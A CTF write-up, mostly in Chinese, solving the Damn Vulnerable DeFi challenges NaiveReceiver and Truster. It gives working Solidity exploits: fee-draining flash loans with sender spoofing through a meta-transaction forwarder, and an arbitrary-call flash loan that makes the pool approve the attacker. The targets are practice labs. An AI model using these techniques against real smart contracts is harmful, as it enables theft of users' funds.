# 8.30

# NaiveReceiver

题目描述

```markdown
There’s a pool with 1000 WETH in balance offering flash loans. It has a fixed fee of 1 WETH. The pool supports meta-transactions by integrating with a permissionless forwarder contract. 

A user deployed a sample contract with 10 WETH in balance. Looks like it can execute flash loans of WETH.

All funds are at risk! Rescue all WETH from the user and the pool, and deposit it into the designated recovery account.
```

解读一下没见过的名词 meta-transaction

[[Web3 全端] Day 17 — Web3 與進階前端：Meta Transaction 免手續費交易](https://medium.com/@a00012025/web3-%E5%85%A8%E7%AB%AF-day-17-web3-%E8%88%87%E9%80%B2%E9%9A%8E%E5%89%8D%E7%AB%AF-meta-transaction-%E5%85%8D%E6%89%8B%E7%BA%8C%E8%B2%BB%E4%BA%A4%E6%98%93-395e5f72b669)

大致的想法是：

> 如果使用者想發交易卻又不想付手續費的話，有什麼可能的作法呢？一個想法是那使用者 A 只要簽名好一個「他想發 xxx 交易」的訊息就好（也就是他的「意圖」, intent），並把這個訊息交由另一個地址 B 發送交易，並透過智能合約的邏輯模擬出就像是 A 親自發出這筆交易一樣的效果，這樣就是一種 Meta Transaction 的作法了。
> 

大体的思路就是帮助receiver发起闪电贷请求，来收取用户的fee来将用户的weth转移到deployer手里，最后在通过deployer将质押的eth转移到rec

exp

```solidity
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i=0; i<10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(deployer)))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            30000000,
            forwarder.nonces(player),
            callData,
            1 days
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        require(forwarder.execute(request, signature));
    }
    }

```

# Truster

desc

```markdown
# Truster

More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.

The pool holds 1 million DVT tokens. You have nothing.

To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

```

该合约并没有按照flashloan的标准在转账后执行receiver的Onflashloan()函数，相反它提供了调用者可以通过Data自选的方法来进行，我们可以选择让flashloan合约approve我们使用它所有的代币

exp

```solidity
// SPDX-License-Identifier: MIT
// test/TrusterExploiter.sol
pragma solidity ^0.8.0;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

contract TrusterExploiter{
    
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(address tokenAddress, address poolAddress, address recoveryAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function attack() external returns(bool){
        
        uint amount = token.balanceOf(address(pool));
        require(
            pool.flashLoan(
                0,
                address(this),
                address(token),
                abi.encodeWithSignature("approve(address,uint256)", address(this), amount)
                )
            );

        require(token.transferFrom(address(pool), address(this), amount));
        require(token.transfer(recovery, amount));

        return true;
    }
}
```

```solidity
function test_truster() public checkSolvedByPlayer {
        TrusterExploiter trusterExploiter = new TrusterExploiter(address(token), address(pool), address(recovery));
        require(
            trusterExploiter.attack()
        );
    }
```